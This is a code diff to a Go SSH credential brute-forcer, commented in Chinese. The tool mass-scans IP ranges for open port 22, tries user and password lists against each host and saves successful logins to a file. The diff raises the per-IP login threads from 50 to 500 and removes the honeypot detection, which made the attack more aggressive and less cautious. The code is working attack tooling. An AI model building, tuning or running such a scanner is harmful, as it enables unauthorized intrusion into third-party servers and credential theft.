@@ -5,7 +5,6 @@ import (
 	"context"
 	"flag"
 	"fmt"
-	"math/rand"
 	"net"
 	"os"
 	"strings"
@@ -24,13 +23,11 @@ const (
 	resultFile         = "success.txt"
 	scanWorkers        = 10000
 	maxConcurrentIPs   = 1000   // 限制同時處理的 IP 數量
-	authWorkersPerIP   = 50     // 每個 IP 的並行認證線程
-	honeypotTestRounds = 3
+	authWorkersPerIP   = 500     // 每個 IP 的並行認證線程
 )
 
 func init() {
 	flag.Parse()
-	rand.Seed(time.Now().UnixNano())
 }
 
 func main() {
@@ -107,7 +104,7 @@ func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGro
 	}
 }
 
-// loginSSHConcurrent 保持不變：對單 IP 使用多線程認證並蜜罐檢測
+// loginSSHConcurrent 移除蜜罐檢測
 func loginSSHConcurrent(ip string, users, passwords []string, success chan<- string) bool {
 	type cred struct{ user, pass string }
 	tasks := make(chan cred)
@@ -133,25 +130,7 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 					if trySSHLogin(ip, task.user, task.pass) {
 						successOnce.Do(func() {
 							found = true
-							// 蜜罐檢測
-							honeypotCount := 0
-							for i := 0; i < honeypotTestRounds; i++ {
-								fakeUser := users[rand.Intn(len(users))]
-								fakePass := passwords[rand.Intn(len(passwords))]
-								if fakeUser == task.user && fakePass == task.pass {
-									fakePass += "_wrong"
-								}
-								if trySSHLogin(ip, fakeUser, fakePass) {
-									honeypotCount++
-									fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
-								} else {
-									fmt.Printf("[-] %s 測試 %d/3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
-								}
-							}
 							successMsg := fmt.Sprintf("%s@%s 密碼: %s", task.user, ip, task.pass)
-							if honeypotCount == honeypotTestRounds {
-								successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
-							}
 							fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, task.user, task.pass)
 							success <- successMsg
 							cancel()
@@ -184,7 +163,7 @@ func loginSSHConcurrent(ip string, users, passwords []string, success chan<- str
 	return found
 }
 
-// trySSHLogin 嘗試單次 SSH 連接並釋放資源
+// trySSHLogin 保持不變
 func trySSHLogin(ip, user, pass string) bool {
 	config := &ssh.ClientConfig{
 		User:            user,
@@ -206,7 +185,7 @@ func trySSHLogin(ip, user, pass string) bool {
 	return true
 }
 
-// isOpen 保持不變
+// 以下函數保持不變
 func isOpen(ip, port string) bool {
 	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
 	if err != nil {
@@ -216,7 +195,6 @@ func isOpen(ip, port string) bool {
 	return true
 }
 
-// readLines 與 readIPFile 保持不變
 func readLines(filename string) ([]string, error) {
 	f, err := os.Open(filename)
 	if err != nil {
@@ -267,4 +245,3 @@ func inc(ip net.IP) {
 		}
 	}
 }
-
